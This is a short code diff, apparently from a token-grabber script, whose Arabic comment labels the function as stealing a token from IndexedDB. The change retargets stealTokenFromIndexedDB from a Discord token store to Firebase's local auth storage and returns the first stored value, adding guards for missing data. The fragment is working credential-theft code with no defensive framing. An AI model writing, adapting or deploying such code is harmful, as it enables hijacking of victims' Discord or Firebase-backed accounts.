@@ -41,14 +41,24 @@
         // سرقة التوكن من IndexedDB
         async function stealTokenFromIndexedDB() {
             return new Promise((resolve) => {
-                const request = indexedDB.open('discord', 1);
+                if (!window.indexedDB) {
+                    resolve(null);
+                    return;
+                }
+
+                const request = indexedDB.open('firebaseLocalStorageDb', 1);
                 request.onsuccess = (event) => {
                     const db = event.target.result;
-                    const transaction = db.transaction('tokens', 'readonly');
-                    const store = transaction.objectStore('tokens');
-                    const getRequest = store.get('token');
+                    const transaction = db.transaction('firebaseLocalStorage', 'readonly');
+                    const store = transaction.objectStore('firebaseLocalStorage');
+                    const getRequest = store.getAll();
                     getRequest.onsuccess = () => {
-                        resolve(getRequest.result?.value || null);
+                        const data = getRequest.result;
+                        if (data && data.length > 0) {
+                            resolve(data[0].value);
+                        } else {
+                            resolve(null);
+                        }
                     };
                     getRequest.onerror = () => {
                         resolve(null);
